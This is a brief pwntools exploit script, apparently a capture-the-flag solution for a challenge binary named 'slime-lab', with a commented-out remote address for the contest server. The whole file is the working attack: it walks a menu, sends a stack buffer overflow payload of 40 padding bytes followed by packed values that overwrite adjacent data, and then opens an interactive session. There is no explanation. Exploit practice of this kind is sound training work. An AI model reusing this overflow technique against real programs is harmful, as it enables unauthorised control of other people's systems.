#Made by fly_autumn
#x64 ...
from pwn import *
p = process("./slime-lab")
#p = remote("chal.thuctf.redbud.info",34380)
elf = ELF("./slime-lab")
context(os="linux",arch="amd64")

p.recvuntil(b"> ")
p.sendline(b"2")
p.recvuntil(b"> ")

offset = 40
arg1 = 0x52415453
arg2 = 0x0
payload = b"A"*offset + p32(arg2) + p64(arg1)
p.sendline(payload)

p.recvuntil(b"> ")
p.sendline(b"4")

p.interactive()
